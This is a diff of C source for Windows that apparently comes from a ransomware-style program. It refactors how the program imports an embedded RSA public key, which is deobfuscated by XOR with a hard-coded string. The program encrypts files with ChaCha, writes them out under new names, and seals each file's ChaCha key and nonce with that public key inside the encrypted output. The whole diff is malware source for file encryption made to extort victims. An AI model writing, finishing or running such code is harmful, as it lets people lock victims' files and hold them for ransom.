@@ -99,15 +99,7 @@ CLEANUP:
 	return return_val;
 }
 
-int cryptInit(HCRYPTPROV hCryptProv) {
-	if (CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, 0)) {
-		printf("CryptAcquireContext succeeds.\n");
-	}
-	else {
-		printf("CryptAcquireContext fails.\n");
-		return -1;
-	}
-
+int cryptInit() {
 	const char* decryptKey = "yayeet";
 	for (int i = 0; i < 532; i++) {
 		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
@@ -121,10 +113,7 @@ int cryptInit(HCRYPTPROV hCryptProv) {
 }
 
 
-void cryptCleanUp(HCRYPTPROV hCryptProv) {
-	if (hCryptProv != NULL) {
-		CryptReleaseContext(hCryptProv, 0);
-	}
+void cryptCleanUp() {
 	if (memePath) {
 		free((void*)memePath);
 	}
@@ -302,18 +291,13 @@ DWORD getLengthString(LPCSTR oriFileName) {
 	return i;
 }
 
-int encryptKey(HCRYPTPROV hCryptProv, HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
+int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
 	SetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
-	HCRYPTKEY publicKey;
 	BYTE* keyBuffer = NULL;
 	DWORD dataLength = 256 + 8;
 	DWORD fileOffset = 0;
 	BYTE* imageBuffer = NULL;
 	DWORD byteRead = 0;
-	if (CryptImportKey(hCryptProv, publicKeyBlob, 532, 0, 0, &publicKey) == FALSE) {
-		goto CLEANUP;
-	}
-
 	keyBuffer = (BYTE*)calloc(524, 1);
 	if (!keyBuffer) {
 		goto CLEANUP;
@@ -372,7 +356,7 @@ CLEANUP:
 	return 0;
 }
 
-int fileEncrypt(HCRYPTPROV hCryptProv, LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
+int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
 	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD fileSize = GetFileSize(inFile, NULL);
 	DWORD lenName = getLengthString((CHAR*)oriFileName);
@@ -418,7 +402,7 @@ int fileEncrypt(HCRYPTPROV hCryptProv, LPCSTR oriFileName, BYTE* key, BYTE* nonc
 		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
 	}
 
-	encryptKey(hCryptProv, outFile, key, nonce);
+	encryptKey(hCryptProv, publicKey, outFile, key, nonce);
 	returnValue = 0;
 CLEANUP:
 	if (newFileName) {
@@ -433,5 +417,4 @@ CLEANUP:
 	}
 	return returnValue;
 }
-
 
